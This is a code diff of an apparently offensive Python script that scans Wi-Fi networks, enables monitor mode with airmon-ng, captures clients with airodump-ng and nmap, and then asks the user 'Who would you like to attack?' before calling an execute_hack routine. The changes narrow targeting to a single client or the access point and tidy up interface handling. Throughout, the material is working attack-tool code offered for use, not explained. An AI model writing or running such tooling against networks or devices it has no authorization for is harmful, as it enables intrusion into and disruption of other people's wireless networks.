@@ -66,15 +66,12 @@ def dump_network_info(Info):
     user_input = input("Choose an SSID to target: ")
     victim_network = ssids_table.get_string(border=False, header=False, fields=["SSID"], start=int(user_input)-1, end=int(user_input)).strip()
 
-    info = Info(interface, victim_network, ssid_dict[victim_network])
-
     if victim_network == user_ssid:
         print("You are connected to " + victim_network + ". Running nmap... ")
         # Get IPs
         sp = subprocess.Popen(["ip", "addr", "show", interface], stdout=subprocess.PIPE)
-        
         ips = subprocess.check_output(["grep", "inet", "-m", "1"], stdin=sp.stdout).decode()[9:26]
-        print(ips)
+        # print(ips)
         sp.wait()
         # TODO: Check output, log verbosely,
         # nmap = subprocess.call(["nmap", "-n", "-A", "-oX", FILE_PREFIX+".xml", ips], stdout=subprocess.DEVNULL) # should we print nmap results to screen too?
@@ -86,18 +83,25 @@ def dump_network_info(Info):
     print("Enabling monitor mode... ")
     try:
         subprocess.check_output(["sudo", "airmon-ng", "start", interface])
+        cmd = "ip link show | awk '/mon/ {print $2}'"
+        ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
+        mon_interface = ps.communicate()[0].decode()[:-2]
         print("Starting airodump for 10 seconds... ")
-        # TODO: Not all monitor interfaces are interface+mon
-        airodump = subprocess.Popen(["sudo", "airodump-ng","--bssid", ssid_dict[victim_network], interface+"mon", "-w", FILE_PREFIX, "-o", "csv"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        # TODO: Not all monitor interfaces are interface+mons
+        airodump = subprocess.Popen(["sudo", "airodump-ng","--bssid", ssid_dict[victim_network], mon_interface, "-w", FILE_PREFIX, "-o", "csv"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         # After 10 seconds, raise a TimeoutExpired exception to stop airodump
         o_airodump, unused_stderr = airodump.communicate(timeout=10)
     except subprocess.CalledProcessError as e:
         print ("Failed to enable monitor mode: " + e.output)
     except subprocess.TimeoutExpired:
         airodump.terminate()
+        subprocess.check_output(["sudo", "airmon-ng", "stop", mon_interface])
+        subprocess.call(["service", "network-manager", "start"])
         print("Done.\n")
         # Fixes invisible text in terminal & no echo after terminating airodump
         subprocess.call(["stty", "sane"])
+
+    info = Info(mon_interface, victim_network, ssid_dict[victim_network])
     return info
 
 def create_target_table():
@@ -111,8 +115,9 @@ def create_target_table():
     Service  = namedtuple("Service", "port, state, service")
     clients  = dict()
 
-
     ap = parse_airodump(clients, Client)
+    # print(ap)
+
     nmap_success = parse_nmap(clients, Client, Service, ap)
 
     # Create a sorted list of clients by ip first and then by power
@@ -121,9 +126,9 @@ def create_target_table():
 
     clients_table = gen_clients_table(clients, nmap_success)
 
-    victims = handle_victims_choices(clients_table, clients)
+    victim = handle_victims_choices(clients_table, clients)
 
-    return victims
+    return victim
 
 def parse_airodump(clients, Client):
     """
@@ -220,25 +225,38 @@ def handle_victims_choices(clients_table, clients):
     Returns a list of victims (a subset of the clients) when the user enters
     valid, comma-separted indices or enters 'A' to target all clients.
     """
-    victims = []
-    while not victims:
+    # victims = []
+    # while not victims:
+    #     print("\n\n\n")
+        # print(clients_table)
+    #     user_input = input("Who would you like to attack? (Separate " + "indices by commas or enter 'A' for all.) ")
+        # if user_input.lower() == "a":
+        #     victims = [client.mac for client in clients]
+        # else:
+        #     try:
+        #         victim_indices = list(map(str.strip, user_input.split(",")))
+        #         victim_indices = map(int, victim_indices)
+        #         for i in victim_indices:
+        #             victims.append(clients[i].mac)
+        #     except Exception as e:
+        #         victims = []
+        #         print("Enter a comma-separated list of numbers or 'A' for all " +
+        #                "(exception: {})".format(e))
+        
+    # return victims
+    victim = None
+    while not victim:
         print("\n\n\n")
         print(clients_table)
-        user_input = input("Who would you like to attack? (Separate " + 
-                           "indices by commas or enter 'A' for all.) ").strip()
-        if user_input.lower() == "a":
-            victims = [client.mac for client in clients]
+        user_input = input("Who would you like to attack? Enter 'A' to attack the access point: ").strip()
+        if user_input.lower() == 'a':
+            return victim
         else:
             try:
-                victim_indices = list(map(str.strip, user_input.split(",")))
-                victim_indices = map(int, victim_indices)
-                for i in victim_indices:
-                    victims.append(clients[i].mac)
+                victim = clients[int(user_input)].mac
             except Exception as e:
-                victims = []
-                print("Enter a comma-separated list of numbers or 'A' for all " +
-                       "(exception: {})".format(e))
-    return victims
+                print("Please enter a number from 0- ".format(len(clients)-1))
+    return victim
 
 def execute_hack(info, victims):
     """
@@ -274,8 +292,8 @@ if __name__ == "__main__":
 
         clean_old_results()
         info = dump_network_info(Info)
-        victims = create_target_table()
-        execute_hack(info, victims)
+        victim = create_target_table()
+        execute_hack(info, victim)
         print("uber l33t haxxing just happened")
     else:
         print("Script requires root access to perform network operations.")
